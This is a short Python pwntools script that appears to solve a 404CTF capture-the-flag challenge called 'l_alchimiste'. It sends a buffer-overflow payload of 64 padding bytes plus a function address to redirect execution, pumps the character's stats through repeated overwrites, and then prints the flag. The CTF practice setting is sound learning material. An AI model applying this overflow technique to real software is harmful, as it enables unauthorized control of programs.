import pwn
import time


def drink_potion(r):
    r.sendline(b"2")
    time.sleep(0.1)


def buy_potion(r):
    r.sendline(b"1")
    time.sleep(0.1)


def send_message(r, function_address):
    r.sendline(b"3")
    time.sleep(0.1)
    payload = b"A" * 64 + pwn.p64(function_address)
    r.sendline(payload)
    time.sleep(0.1)


def get_flag(r):
    r.sendline(b"5")
    time.sleep(0.1)
    print(r.clean().decode())


def main():
    # process = pwn.remote("challenges.404ctf.fr", 30944)

    elf = pwn.ELF("./l_alchimiste")
    process = pwn.process("./l_alchimiste")

    str_function = elf.symbols["incStr"]
    int_function = elf.symbols["incInt"]

    buy_potion(process)

    print(process.recvuntil(b">>>").decode())

    # From 100 to 150
    for _ in range(5):
        send_message(process, str_function)
        drink_potion(process)

    for _ in range(10):
        send_message(process, int_function)
        drink_potion(process)
    time.sleep(0.1)
    get_flag(process)


if __name__ == "__main__":
    main()
